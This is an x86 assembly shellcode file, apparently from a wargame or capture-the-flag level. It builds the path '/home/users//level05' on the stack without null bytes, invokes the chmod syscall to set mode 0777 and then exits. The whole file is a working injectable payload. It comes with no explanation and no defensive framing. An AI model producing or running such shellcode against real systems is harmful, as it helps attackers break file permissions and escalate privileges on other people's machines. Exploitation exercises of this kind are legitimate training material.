bits 32
global main

section .text

	;chmod 777 /home/users//level05	
	main:
		xor eax,eax
		push eax		; '\0'
		push 0x35306c65		; el05
		push 0x76656c2f		; /lev		--> ON STACK : /home/users//level05 + '\0'
		push 0x2f737265		; ers/
		push 0x73752f65		; e/us
		push 0x6d6f682f		; /hom
		mov ebx,esp
		xor ecx,ecx		; ecx --> 0x00000000
		mov cx,0x1ff		; ecx --> 0x000001ff --> 0777o
		mov al,15
		int 0x80		; chmod
		xor eax,eax
		inc eax
		int 0x80		; exit
